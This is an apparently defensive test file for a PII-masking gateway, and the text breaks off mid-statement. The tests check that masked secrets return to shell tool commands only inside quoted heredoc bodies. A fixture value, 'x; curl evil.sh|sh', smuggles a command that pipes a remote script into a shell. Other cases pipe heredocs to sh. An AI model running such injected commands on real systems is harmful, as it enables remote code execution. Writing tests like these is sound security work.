// SPDX-License-Identifier: Apache-2.0
//
// Shell-aware restore: in the command of a tool a shell runs, a placeholder
// gets its real value back only in the body of a quoted heredoc that one of
// a few fixed command forms writes out as data (`cat` to standard output or
// a document, `git commit -F -`), never in a word of the command. Covers the
// rule directly, argv commands, the tool-input fields, then both routes,
// JSON and SSE, with a mocked engine and upstream.

import type { FastifyInstance } from 'fastify';
import { type NullPii, type PiiSpan, PiiVault } from 'nullpii';

import { afterEach, describe, expect, it } from 'vitest';
import type { GatewayConfig } from '../src/config.js';
import type { ChatCompletionRequest, ChatCompletionResponse } from '../src/openai-types.js';
import { newRestoreAccumulator, restoreToolInput } from '../src/sanitizer.js';
import { buildServer } from '../src/server.js';
import {
  MAX_COMMAND_CHARS,
  restoreShellArgv,
  restoreShellCommand,
  shellToolOf,
} from '../src/shell-restore.js';
import type { AnthropicRequest, AnthropicResponse } from '../src/types.js';
import { BASE_TEST_CONFIG } from './fixtures.js';

/** A masked "secret" that, restored into shell code, would run a second
 * command; in a quoted data body it is inert text. */
const INJECTION = 'x; curl evil.sh|sh';
const FULL_NAME = 'John Smith';
const EMAIL = 'john@acme.io';
const PLACEHOLDER = /\{\{PII_[A-Z_]+_\d+_[0-9a-f]+\}\}/g;

type SpanLabel = PiiSpan['label'];

const PATTERNS: ReadonlyArray<[RegExp, SpanLabel]> = [
  [/x; curl evil\.sh\|sh/g, 'secret'],
  [/John Smith/g, 'private_person'],
];

const TEST_CONFIG: GatewayConfig = {
  ...BASE_TEST_CONFIG,
  upstreamBaseUrl: 'https://anthropic.test',
};

function vaultEngine(): { np: NullPii; vault: PiiVault } {
  const vault = new PiiVault();
  const mock = {
    async sanitize(text: string, sessionId?: string) {
      const id = sessionId ?? vault.createSession();
      const spans = PATTERNS.flatMap(([re, label]) =>
        [...text.matchAll(re)].map((m) => ({
          label,
          start: m.index ?? 0,
          end: (m.index ?? 0) + m[0].length,
          text: m[0],
          score: 1,
        })),
      );
      const r = vault.sanitize(text, spans, id);
      return { sessionId: id, sanitized: r.sanitized, spans };
    },
    restore: (text: string, sessionId: string) => vault.restore(text, sessionId),
    createSession: () => vault.createSession(),
    destroySession: (sessionId: string) => vault.destroySession(sessionId),
  };
  return { np: mock as unknown as NullPii, vault };
}

function bake(vault: PiiVault, sessionId: string, value: string, label: SpanLabel): string {
  const span = { label, start: 0, end: value.length, text: value, score: 1 };
  return vault.sanitize(value, [span], sessionId).sanitized;
}

/** The distinct `[secret, person]` placeholders, in order of first use, of
 * the user message every route test sends or of a command built from it. */
const USER_TEXT = `Run ${INJECTION} for ${FULL_NAME}`;

function placeholdersIn(text: unknown): [string, string] {
  const found = typeof text === 'string' ? (text.match(PLACEHOLDER) ?? []) : [];
  const [secret, person] = new Set(found);
  if (secret === undefined || person === undefined) throw new Error('expected two placeholders');
  return [secret, person];
}

/** The commit form that gets values back: the message is a quoted heredoc
 * `git commit` reads from standard input. */
function commitStdin(message: string): string {
  return `git commit -F - <<'EOF'\n${message}\nEOF`;
}

/** A command each route test sends: both placeholders in a commit message. */
function bashCommand(secret: string, person: string): string {
  return commitStdin(`Thanks ${person}, see ${secret}`);
}

/** What the client must receive: both values back, since the message is
 * text written out as data (the secret is inert there). */
function expectedCommand(): string {
  return commitStdin(`Thanks ${FULL_NAME}, see ${INJECTION}`);
}

const apps: FastifyInstance[] = [];
afterEach(async () => {
  await Promise.all(apps.map((a) => a.close()));
  apps.length = 0;
});

async function serve(
  respond: (body: string) => Response,
  extra: { logStream?: { write(line: string): void }; logLevel?: GatewayConfig['logLevel'] } = {},
) {
  const { np } = vaultEngine();
  const fetchImpl = async (_url: string, init: RequestInit) => respond(init.body as string);
  const config = {
    ...TEST_CONFIG,
    ...(extra.logLevel !== undefined && { logLevel: extra.logLevel }),
  };
  const app = await buildServer({
    config,
    np,
    fetchImpl,
    ...(extra.logStream !== undefined && { logStream: extra.logStream }),
  });
  apps.push(app);
  return app;
}

function sseResponse(frames: string[]): Response {
  return new Response(frames.join(''), { headers: { 'content-type': 'text/event-stream' } });
}

function anthropicFrame(event: string, data: unknown): string {
  return `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
}

function openAiFrame(choices: unknown[]): string {
  return `data: ${JSON.stringify({ id: 'c1', object: 'chat.completion.chunk', choices })}\n\n`;
}

/** Concatenate a stream's tool-input shards per block (Anthropic) or per
 * tool-call index (OpenAI), as the SDKs do. */
function streamedInputs(body: string): Map<number, string> {
  const out = new Map<number, string>();
  const add = (index: number, shard: unknown): void => {
    if (typeof shard === 'string') out.set(index, (out.get(index) ?? '') + shard);
  };
  for (const frame of body.split('\n\n')) {
    const line = frame.split('\n').find((l) => l.startsWith('data: '));
    if (line === undefined || line === 'data: [DONE]') continue;
    const data = JSON.parse(line.slice('data: '.length)) as {
      index?: number;
      delta?: { partial_json?: string };
      choices?: Array<{
        delta?: { tool_calls?: Array<{ index: number; function?: { arguments?: string } }> };
      }>;
    };
    if (typeof data.index === 'number') add(data.index, data.delta?.partial_json);
    for (const call of data.choices?.[0]?.delta?.tool_calls ?? []) {
      add(call.index, call.function?.arguments);
    }
  }
  return out;
}

function harness() {
  const { np, vault } = vaultEngine();
  const sessionId = vault.createSession();
  return { np, vault, sessionId };
}

const restored = (r: { results: ReadonlyArray<{ replacements: number }> }) =>
  r.results.reduce((n, x) => n + x.replacements, 0);

describe('shell restore · the data forms', () => {
  it.each([
    (p: string) => `cat > notes.md <<'EOF'\n${p}\nEOF`,
    (p: string) => `cat >> docs/notes.md <<'EOF'\n${p}\nEOF`,
    (p: string) => `cat <<'EOF' > notes.md\n${p}\nEOF`,
    (p: string) => `cat <<'EOF' >> /tmp/Notes.MD\n${p}\nEOF`,
    (p: string) => `cat <<'EOF'\n${p}\nEOF`,
    (p: string) => `cat > report.csv << "EOF"\nname,${p}\nEOF\n`,
    (p: string) => `git commit -F - <<'EOF'\nFix for ${p}\nEOF`,
    (p: string) => `git commit -a -q --amend -F- <<'MSG'\n${p}\nMSG`,
    (p: string) => `git commit --file=- <<'EOF'\n${p}\nEOF`,
    (p: string) => `git add src/a.ts docs/b.md && git commit -F - <<'EOF'\n${p}\nEOF`,
    (p: string) => `git add -A && git commit -F - <<'EOF'\n${p}\nEOF`,
    (p: string) => `mkdir -p docs/notes && cat > docs/notes/a.md <<'EOF'\n${p}\nEOF`,
  ])('restores a value in the body of a data form: %#', (build) => {
    const { np, vault, sessionId } = harness();
    const name = bake(vault, sessionId, FULL_NAME, 'private_person');

    const r = restoreShellCommand(np, build(name), sessionId);

    expect(restored(r)).toBe(1);
    expect(r.command).toBe(build(FULL_NAME));
  });

  it.each([
    ['a name with an apostrophe', "D'Amico"],
    ['shell syntax, inert in a quoted body', INJECTION],
    ['a tab', 'a\tb'],
    ['quotes and a dollar sign', '"$HOME" `x`'],
  ])('restores %s in a quoted body', (_what, value) => {
    const { np, vault, sessionId } = harness();
    const p = bake(vault, sessionId, value, 'secret');

    const r = restoreShellCommand(np, `cat > notes.md <<'EOF'\n${p}\nEOF`, sessionId);

    expect(r.command).toBe(`cat > notes.md <<'EOF'\n${value}\nEOF`);
  });

  it.each([
    ['a line break', 'a\nb'],
    ['a carriage return', 'a\rb'],
    ['an escape character', 'a\u001bb'],
    ['a line separator', 'a b'],
    ['the delimiter, ending the body early', 'EOF'],
    ['the delimiter inside a line', 'see EOF) here'],
    ['a heredoc operator', 'a <<b'],
  ])('keeps every placeholder when a value holds %s', (_what, value) => {
    const { np, vault, sessionId } = harness();
    const p = bake(vault, sessionId, value, 'secret');
    const command = `cat > notes.md <<'EOF'\nbefore\n${p}\nafter\nEOF`;

    const r = restoreShellCommand(np, command, sessionId);

    expect(restored(r)).toBe(0);
    expect(r.command).toBe(command);
  });

  it('keeps a value that cannot go back masked, and restores the others', () => {
    const { np, vault, sessionId } = harness();
    const ok = bake(vault, sessionId, FULL_NAME, 'private_person');
    const bad = bake(vault, sessionId, 'EOF', 'secret');
    const command = `cat > notes.md <<'EOF'\n${ok}\n${bad}\nEOF`;

    const r = restoreShellCommand(np, command, sessionId);

    expect(r.command).toBe(`cat > notes.md <<'EOF'\n${FULL_NAME}\n${bad}\nEOF`);
    expect(r.keptMasked).toEqual([bad]);
  });

  it('keeps every placeholder when values side by side form a heredoc operator', () => {
    const { np, vault, sessionId } = harness();
    const left = bake(vault, sessionId, 'a<', 'secret');
    const right = bake(vault, sessionId, "<'X'", 'private_person');
    const command = `cat > notes.md <<'EOF'\n${left}${right}\nEOF`;

    const r = restoreShellCommand(np, command, sessionId);

    expect(restored(r)).toBe(0);
    expect(r.command).toBe(command);
  });

  it('keeps every placeholder when a body line starts with the delimiter (ksh93 may end the body there)', () => {
    const { np, vault, sessionId } = harness();
    const name = bake(vault, sessionId, FULL_NAME, 'private_person');
    const command = `cat > notes.md <<'EOF'\n${name}\nEOF)\nEOF`;

    const r = restoreShellCommand(np, command, sessionId);

    expect(restored(r)).toBe(0);
    expect(r.command).toBe(command);
  });
});

describe('shell restore · every other command keeps its placeholders', () => {
  it.each([
    ['an argument', (p: string) => `grep ${p} notes.md`],
    ['a quoted argument', (p: string) => `echo '${p}'`],
    ['a file name', (p: string) => `cat > ${p}.md <<'EOF'\nx\nEOF`],
    ['the line of a data form', (p: string) => `git commit --author=${p} -F - <<'EOF'\nx\nEOF`],
    [
      'a body after a placeholder elsewhere',
      (p: string) => `echo ${p} && cat > n.md <<'EOF'\n${p}\nEOF`,
    ],
    ['an unquoted delimiter', (p: string) => `cat > notes.md <<EOF\n${p}\nEOF`],
    ['a tab-stripping heredoc', (p: string) => `cat > notes.md <<-'EOF'\n${p}\n\tEOF`],
    ['a command after the body', (p: string) => `cat > notes.md <<'EOF'\n${p}\nEOF\nbash notes.md`],
    ['a pipe after the operator', (p: string) => `cat <<'EOF' | sh\n${p}\nEOF`],
    ['the commit form inside $(…)', (p: string) => `git commit -m "$(cat <<'EOF'\n${p}\nEOF\n)"`],
    ['a .txt target', (p: string) => `cat > requirements.txt <<'EOF'\n${p}\nEOF`],
    ['a script target', (p: string) => `cat > run.sh <<'EOF'\n${p}\nEOF`],
    ['a hidden directory', (p: string) => `cat > .git/notes.md <<'EOF'\n${p}\nEOF`],
    ['a bin directory', (p: string) => `cat > venv/bin/notes.md <<'EOF'\n${p}\nEOF`],
    ['/etc', (p: string) => `cat > /private/etc/notes.md <<'EOF'\n${p}\nEOF`],
    ['a home path', (p: string) => `cat > ~/notes.md <<'EOF'\n${p}\nEOF`],
    ['a cd before it', (p: string) => `cd docs && cat > notes.md <<'EOF'\n${p}\nEOF`],
    ['an assignment before it', (p: string) => `LANG=C cat > notes.md <<'EOF'\n${p}\nEOF`],
    ['another program', (p: string) => `tee notes.md <<'EOF'\n${p}\nEOF`],
    [
      'a commit option that runs or writes',
      (p: string) => `git -c x=y commit -F - <<'EOF'\n${p}\nEOF`,
    ],
    ['another commit option', (p: string) => `git commit --template=t -F - <<'EOF'\n${p}\nEOF`],
    [
      'a quoted path in git add',
      (p: string) => `git add 'a b' && git commit -F - <<'EOF'\n${p}\nEOF`,
    ],
    ['two heredocs', (p: string) => `cat <<'A' <<'B' > n.md\n${p}\nA\nx\nB`],
    ['a body with no closing line', (p: string) => `cat > notes.md <<'EOF'\n${p}`],
  ])('keeps every placeholder in %s', (_where, build) => {
    const { np, vault, sessionId } = harness();
    const p = bake(vault, sessionId, EMAIL, 'private_email');

    const r = restoreShellCommand(np, build(p), sessionId);

    expect(restored(r)).toBe(0);
    expect(r.command).toBe(build(p));
  });

  it('keeps every placeholder in a command longer than the limit', () => {
    const { np, vault, sessionId } = harness();
    const p = bake(vault, sessionId, EMAIL, 'private_email');
    const command = `cat > notes.md <<'EOF'\n${p}\n${'x'.repeat(MAX_COMMAND_CHARS)}\nEOF`;

    expect(restored(restoreShellCommand(np, command, sessionId))).toBe(0);
  });

  it('counts an unknown placeholder as unknown, not as kept masked', () => {
    const { np, vault, sessionId } = harness();
    const known = bake(vault, sessionId, 'readme', 'private_url');
    const unknown = known.replace(/_\d+_/, '_99_');

    const r = restoreShellCommand(
      np,
      `cat > notes.md <<'EOF'\n${known} ${unknown}\nEOF`,
      sessionId,
    );

    expect(r.command).toBe(`cat > notes.md <<'EOF'\nreadme ${unknown}\nEOF`);
    expect(r.keptMasked).toHaveLength(0);
    expect(r.results.reduce((n, x) => n + x.unknownPlaceholders.length, 0)).toBe(1);
  });
});

describe('shell restore · call options', () => {
  it('a working directory of the call needs an absolute target', () => {
    const { np, vault, sessionId } = harness();
    const p = bake(vault, sessionId, FULL_NAME, 'private_person');
    const relative = `cat > notes.md <<'EOF'\n${p}\nEOF`;
    const absolute = `cat > /srv/notes.md <<'EOF'\n${p}\nEOF`;

    expect(restored(restoreShellCommand(np, relative, sessionId, { movedDir: true }))).toBe(0);
    expect(restored(restoreShellCommand(np, absolute, sessionId, { movedDir: true }))).toBe(1);
    expect(restored(restoreShellCommand(np, commitStdin(p), sessionId, { movedDir: true }))).toBe(
      1,
    );
  });

  it('keepAll keeps every placeholder', () => {
    const { np, vault, sessionId } = harness();
    const p = bake(vault, sessionId, FULL_NAME, 'private_person');

    expect(restored(restoreShellCommand(np, commitStdin(p), sessionId, { keepAll: true }))).toBe(0);
  });
});

describe('shell restore · argv commands', () => {
  it.each([
    [['bash', '-c'], 1],
    [['bash', '-lc'], 1],
    [['/bin/zsh', '-l', '-c'], 1],
    [['/usr/bin/sh', '-c'], 1],
    [['./bash', '-c'], 0],
    [['sudo', 'bash', '-c'], 0],
    [['BASH', '-c'], 0],
    [['fish', '-c'], 0],
    [['bash', '-x', '-c'], 0],
  ])(
    'restores into the script of %j only for a POSIX shell named as written',
    (shell, expected) => {
      const { np, vault, sessionId } = harness();
      const p = bake(vault, sessionId, FULL_NAME, 'private_person');

      const r = restoreShellArgv(np, [...shell, commitStdin(p)], sessionId);

      expect(restored(r)).toBe(expected);
    },
  );

  it('restores no other word of an array', () => {
    const { np, vault, sessionId } = harness();
    const p = bake(vault, sessionId, EMAIL, 'private_email');

    const r = restoreShellArgv(np, ['grep', '-F', p, 'notes.md'], sessionId);

    expect(r.argv).toEqual(['grep', '-F', p, 'notes.md']);
    expect(r.keptMasked).toEqual([p]);
  });
});

describe('shell restore · Anthropic route', () => {
  function forwardedUserText(body: string): unknown {
    return (JSON.parse(body) as AnthropicRequest).messages[0]?.content;
  }

  it("JSON: `bash` (Anthropic's bash tool) gets the same rule as `Bash`", async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const response: AnthropicResponse = {
        id: 'msg',
        type: 'message',
        role: 'assistant',
        content: [
          {
            type: 'tool_use',
            id: 'tu_1',
            name: 'bash',
            input: { command: bashCommand(secret, person) },
          },
        ],
      };
      return new Response(JSON.stringify(response));
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: { model: 'claude-test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    const [bash] = (res.json() as AnthropicResponse).content as Array<{
      input: Record<string, string>;
    }>;
    expect(bash?.input.command).toBe(expectedCommand());
  });

  it('JSON: a shell tool gets values in command and description only, never in workdir or env', async () => {
    const app = await serve((body) => {
      const [, person] = placeholdersIn(forwardedUserText(body));
      const response: AnthropicResponse = {
        id: 'msg',
        type: 'message',
        role: 'assistant',
        content: [
          {
            type: 'tool_use',
            id: 'tu_1',
            name: 'shell',
            input: {
              command: ['bash', '-lc', 'echo probe > notes.md'],
              workdir: person,
              env: { NAME: person },
              description: `Greet ${person}`,
            },
          },
        ],
      };
      return new Response(JSON.stringify(response));
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: { model: 'claude-test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    const [shell] = (res.json() as AnthropicResponse).content as Array<{
      input: { workdir: string; env: { NAME: string }; description: string };
    }>;
    expect(shell?.input.workdir).toMatch(PLACEHOLDER);
    expect(shell?.input.env.NAME).toMatch(PLACEHOLDER);
    expect(shell?.input.description).toBe(`Greet ${FULL_NAME}`);
  });

  it('JSON: restores a Bash command only where safe, a Write tool fully', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const response: AnthropicResponse = {
        id: 'msg',
        type: 'message',
        role: 'assistant',
        content: [
          {
            type: 'tool_use',
            id: 'tu_1',
            name: 'Bash',
            input: { command: bashCommand(secret, person), description: `Greet ${person}` },
          },
          {
            type: 'tool_use',
            id: 'tu_2',
            name: 'Write',
            input: { file_path: '/tmp/notes.txt', content: `${secret} ${person}` },
          },
        ],
      };
      return new Response(JSON.stringify(response));
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: { model: 'claude-test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    expect(res.statusCode).toBe(200);
    const [bash, write] = (res.json() as AnthropicResponse).content as Array<{
      input: Record<string, string>;
    }>;
    expect(bash?.input.command).toBe(expectedCommand());
    // Not run by the shell: restored as usual.
    expect(bash?.input.description).toBe(`Greet ${FULL_NAME}`);
    expect(write?.input.content).toBe(`${INJECTION} ${FULL_NAME}`);
  });

  it('SSE: same rule for a Bash command streamed as input_json_delta shards', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const bash = JSON.stringify({ command: bashCommand(secret, person) });
      const write = JSON.stringify({ file_path: '/tmp/notes.txt', content: `${secret} ${person}` });
      const cut = bash.indexOf(secret) + 6; // inside the first placeholder
      const shard = (index: number, partial: string) =>
        anthropicFrame('content_block_delta', {
          type: 'content_block_delta',
          index,
          delta: { type: 'input_json_delta', partial_json: partial },
        });
      const start = (index: number, name: string) =>
        anthropicFrame('content_block_start', {
          type: 'content_block_start',
          index,
          content_block: { type: 'tool_use', id: `tu_${index}`, name, input: {} },
        });
      const stop = (index: number) =>
        anthropicFrame('content_block_stop', { type: 'content_block_stop', index });
      return sseResponse([
        start(0, 'Bash'),
        shard(0, bash.slice(0, cut)),
        shard(0, bash.slice(cut)),
        stop(0),
        start(1, 'Write'),
        shard(1, write),
        stop(1),
        anthropicFrame('message_stop', { type: 'message_stop' }),
      ]);
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: {
        model: 'claude-test',
        stream: true,
        messages: [{ role: 'user', content: USER_TEXT }],
      },
    });

    expect(res.statusCode).toBe(200);
    const inputs = streamedInputs(res.body);
    const bash = JSON.parse(inputs.get(0) ?? '') as { command: string };
    expect(bash.command).toBe(expectedCommand());
    expect(JSON.parse(inputs.get(1) ?? '')).toEqual({
      file_path: '/tmp/notes.txt',
      content: `${INJECTION} ${FULL_NAME}`,
    });
  });

  it('SSE: a block index started twice gets no value (clients differ on which block it is)', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const input = JSON.stringify({ command: `echo ${secret} ${person}` });
      const start = (name: string) =>
        anthropicFrame('content_block_start', {
          type: 'content_block_start',
          index: 0,
          content_block: { type: 'tool_use', id: 'tu_0', name, input: {} },
        });
      return sseResponse([
        start('Bash'),
        start('Write'),
        anthropicFrame('content_block_delta', {
          type: 'content_block_delta',
          index: 0,
          delta: { type: 'input_json_delta', partial_json: input },
        }),
        anthropicFrame('content_block_stop', { type: 'content_block_stop', index: 0 }),
        anthropicFrame('message_stop', { type: 'message_stop' }),
      ]);
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/messages',
      payload: {
        model: 'claude-test',
        stream: true,
        messages: [{ role: 'user', content: USER_TEXT }],
      },
    });

    const command = (JSON.parse(streamedInputs(res.body).get(0) ?? '') as { command: string })
      .command;
    expect(command).not.toContain(INJECTION);
    expect(command).not.toContain(FULL_NAME);
  });
});

describe('shell restore · OpenAI route', () => {
  function forwardedUserText(body: string): unknown {
    return (JSON.parse(body) as ChatCompletionRequest).messages[0]?.content;
  }

  it('JSON: restores a `bash` command only where safe, another tool fully', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const response: ChatCompletionResponse = {
        id: 'c1',
        object: 'chat.completion',
        choices: [
          {
            index: 0,
            finish_reason: 'tool_calls',
            message: {
              role: 'assistant',
              content: null,
              tool_calls: [
                {
                  id: 'call_1',
                  type: 'function',
                  function: {
                    name: 'bash',
                    arguments: JSON.stringify({ command: bashCommand(secret, person) }),
                  },
                },
                {
                  id: 'call_2',
                  type: 'function',
                  function: {
                    name: 'write_file',
                    arguments: JSON.stringify({ content: `${secret} ${person}` }),
                  },
                },
                {
                  id: 'call_3',
                  type: 'custom',
                  custom: { name: 'shell', input: `echo ${secret} '${person}'` },
                },
              ],
            },
          },
        ],
      };
      return new Response(JSON.stringify(response));
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/chat/completions',
      payload: { model: 'gpt-test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    expect(res.statusCode).toBe(200);
    const calls = (res.json() as ChatCompletionResponse).choices[0]?.message?.tool_calls ?? [];
    const bash = JSON.parse(calls[0]?.function?.arguments ?? '') as { command: string };
    expect(bash.command).toBe(expectedCommand());
    expect(JSON.parse(calls[1]?.function?.arguments ?? '')).toEqual({
      content: `${INJECTION} ${FULL_NAME}`,
    });
    // A custom shell tool's whole input is the command: words keep their
    // placeholders.
    const [secret, person] = placeholdersIn(calls[2]?.custom?.input);
    expect(calls[2]?.custom?.input).toBe(`echo ${secret} '${person}'`);
  });

  it('JSON: a `shell` call whose command is an argv array (Codex) gets the rule', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const response: ChatCompletionResponse = {
        id: 'c1',
        object: 'chat.completion',
        choices: [
          {
            index: 0,
            finish_reason: 'tool_calls',
            message: {
              role: 'assistant',
              content: null,
              tool_calls: [
                {
                  id: 'call_1',
                  type: 'function',
                  function: {
                    name: 'shell',
                    arguments: JSON.stringify({
                      command: ['bash', '-lc', `echo ${secret} '${person}'`],
                      workdir: '/tmp',
                    }),
                  },
                },
              ],
            },
          },
        ],
      };
      return new Response(JSON.stringify(response));
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/chat/completions',
      payload: { model: 'gpt-test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    const calls = (res.json() as ChatCompletionResponse).choices[0]?.message?.tool_calls ?? [];
    const args = JSON.parse(calls[0]?.function?.arguments ?? '') as { command: string[] };
    const [secret, person] = placeholdersIn(args.command[2]);
    expect(args.command).toEqual(['bash', '-lc', `echo ${secret} '${person}'`]);
  });

  it('SSE: same rule for a `shell` call whose arguments stream in shards', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const args = JSON.stringify({ command: bashCommand(secret, person) });
      const cut = args.indexOf(secret) + 6;
      const call = (fn: Record<string, string>, extra: Record<string, string> = {}) =>
        openAiFrame([{ index: 0, delta: { tool_calls: [{ index: 0, ...extra, function: fn }] } }]);
      return sseResponse([
        call({ name: 'shell', arguments: '' }, { id: 'call_1', type: 'function' }),
        call({ arguments: args.slice(0, cut) }),
        call({ arguments: args.slice(cut) }),
        openAiFrame([{ index: 0, delta: {}, finish_reason: 'tool_calls' }]),
        'data: [DONE]\n\n',
      ]);
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/chat/completions',
      payload: {
        model: 'gpt-test',
        stream: true,
        messages: [{ role: 'user', content: USER_TEXT }],
      },
    });

    expect(res.statusCode).toBe(200);
    const command = (JSON.parse(streamedInputs(res.body).get(0) ?? '') as { command: string })
      .command;
    expect(command).toBe(expectedCommand());
  });

  it.each([
    ['repeated unchanged keeps its values', ['shell', 'shell'], true],
    ['sent as two different fragments gets no value', ['my_', 'shell'], false],
  ])('SSE: a tool name %s', async (_what, names, restores) => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const args = JSON.stringify({ command: bashCommand(secret, person) });
      const call = (fn: Record<string, string>) =>
        openAiFrame([{ index: 0, delta: { tool_calls: [{ index: 0, function: fn }] } }]);
      return sseResponse([
        call({ name: names[0] ?? '', arguments: '' }),
        call({ name: names[1] ?? '', arguments: args }),
        openAiFrame([{ index: 0, delta: {}, finish_reason: 'tool_calls' }]),
        'data: [DONE]\n\n',
      ]);
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/chat/completions',
      payload: {
        model: 'gpt-test',
        stream: true,
        messages: [{ role: 'user', content: USER_TEXT }],
      },
    });

    const command = (JSON.parse(streamedInputs(res.body).get(0) ?? '') as { command: string })
      .command;
    expect(command === expectedCommand()).toBe(restores);
    expect(PLACEHOLDER.test(command)).toBe(!restores);
    PLACEHOLDER.lastIndex = 0;
  });

  it('SSE: a frame whose data is JSON but not an object holds every later tool input', async () => {
    const app = await serve((body) => {
      const [secret, person] = placeholdersIn(forwardedUserText(body));
      const args = JSON.stringify({ command: bashCommand(secret, person) });
      return sseResponse([
        'data: 42\n\n',
        openAiFrame([
          {
            index: 0,
            delta: { tool_calls: [{ index: 0, function: { name: 'bash', arguments: args } }] },
          },
        ]),
        openAiFrame([{ index: 0, delta: {}, finish_reason: 'tool_calls' }]),
        'data: [DONE]\n\n',
      ]);
    });

    const res = await app.inject({
      method: 'POST',
      url: '/v1/chat/completions',
      payload: {
        model: 'gpt-test',
        stream: true,
        messages: [{ role: 'user', content: USER_TEXT }],
      },
    });

    const command = (JSON.parse(streamedInputs(res.body).get(0) ?? '') as { command: string })
      .command;
    expect(command).not.toContain(FULL_NAME);
    expect(command).not.toContain(INJECTION);
  });
});

describe('shell restore · request log', () => {
  it.each([
    ['/v1/messages', 'anthropic.messages.restored'],
    ['/v1/chat/completions', 'openai.chat.restored'],
  ])('%s logs how many placeholders stayed masked, never a value', async (url, message) => {
    const lines: string[] = [];
    const app = await serve(
      (body) => {
        const request = JSON.parse(body) as { messages: Array<{ content: unknown }> };
        const [secret, person] = placeholdersIn(request.messages[0]?.content);
        const command = `echo ${secret} && echo '${secret}' && echo "${person}" && echo ${person}`;
        const response =
          url === '/v1/messages'
            ? {
                id: 'msg',
                type: 'message',
                role: 'assistant',
                content: [{ type: 'tool_use', id: 'tu', name: 'Bash', input: { command } }],
              }
            : {
                id: 'c1',
                object: 'chat.completion',
                choices: [
                  {
                    index: 0,
                    message: {
                      role: 'assistant',
                      tool_calls: [
                        {
                          id: 'call',
                          type: 'function',
                          function: { name: 'bash', arguments: JSON.stringify({ command }) },
                        },
                      ],
                    },
                  },
                ],
              };
        return new Response(JSON.stringify(response));
      },
      { logLevel: 'info', logStream: { write: (line) => lines.push(line) } },
    );

    const res = await app.inject({
      method: 'POST',
      url,
      payload: { model: 'test', messages: [{ role: 'user', content: USER_TEXT }] },
    });

    expect(res.statusCode).toBe(200);
    const entry = lines
      .map((l) => JSON.parse(l) as { msg?: string; unsafeShellPlaceholders?: unknown })
      .find((l) => l.msg === message);
    // The secret and the name, each quoted and unquoted, stayed masked.
    expect(entry?.unsafeShellPlaceholders).toBe(4);
    const log = lines.join('');
    for (const value of [INJECTION, 'evil.sh', FULL_NAME, 'Smith']) {
      expect(log).not.toContain(value);
    }
  });
});

describe('shell restore · tool input fields', () => {
  function harness() {
    const { np, vault } = vaultEngine();
    const sessionId = vault.createSession();
    return { np, vault, sessionId };
  }

  it('keeps every placeholder in a shell tool input that is not an object', () => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');
    for (const input of [`grep ${word} notes.md`, ['grep', word, 'notes.md']]) {
      const acc = newRestoreAccumulator();
      expect(restoreToolInput(np, input, sessionId, acc, shellToolOf('shell'))).toEqual(input);
      expect(acc.unsafeShell).toBe(1);
    }
  });

  it('counts a placeholder in a key of a shell tool input as kept masked', () => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');
    const input = { command: 'git status', [word]: 'x' };
    const acc = newRestoreAccumulator();

    expect(restoreToolInput(np, input, sessionId, acc, shellToolOf('Bash'))).toEqual(input);
    expect(acc.unsafeShell).toBe(1);
  });

  it('gives no shell tool a value when the gateway runs on Windows', () => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');
    const acc = newRestoreAccumulator();

    const command = `cat > notes.md <<'EOF'\n${word}\nEOF`;
    const onWindows = restoreToolInput(
      np,
      { command },
      sessionId,
      acc,
      shellToolOf('Bash', 'win32'),
    );
    const onMac = restoreToolInput(np, { command }, sessionId, acc, shellToolOf('Bash', 'darwin'));

    expect((onWindows as { command: string }).command).toContain(word);
    expect((onMac as { command: string }).command).toContain(EMAIL);
  });

  it('keeps every value when the call sets an environment', () => {
    const { np, vault, sessionId } = harness();
    const word = bake(vault, sessionId, EMAIL, 'private_email');
    const acc = newRestoreAccumulator();
    const command = ['bash', '-lc', `cat > /srv/notes.md <<'EOF'\n${word}\nEOF`];

    const withEnv = restoreToolInput(
      np,
      { command, env: { X: '1' } },
      sessionId,
      acc,
      shellToolOf('shell'),
    );
    const emptyEnv = restoreToolInput(
      np,
      { command, env: {} },
      sessionId,
      acc,
      shellToolOf('shell'),
    );

    expect((withEnv as { command: string[] }).command[2]).toContain(word);
    expect((emptyEnv as { command: string[] }).command[2]).toContain(EMAIL);
  });

  it('treats a workdir as a cd: a relative write gets no value', () => {
    const { np, vault, sessionId } = harness();
    const name = bake(vault, sessionId, FULL_NAME, 'private_person');
    const command = `cat > notes.md <<'EOF'\n${name}\nEOF`;
    const acc = newRestoreAccumulator();

    const moved = restoreToolInput(
      np,
      { command, workdir: '/srv/x' },
      sessionId,
      acc,
      shellToolOf('shell'),
    );
    const stays = restoreToolInput(np, { command }, sessionId, acc, shellToolOf('shell'));

    expect((moved as { command: string }).command).toBe(command);
    expect((stays as { command: string }).command).toContain(FULL_NAME);
  });

  it.each([
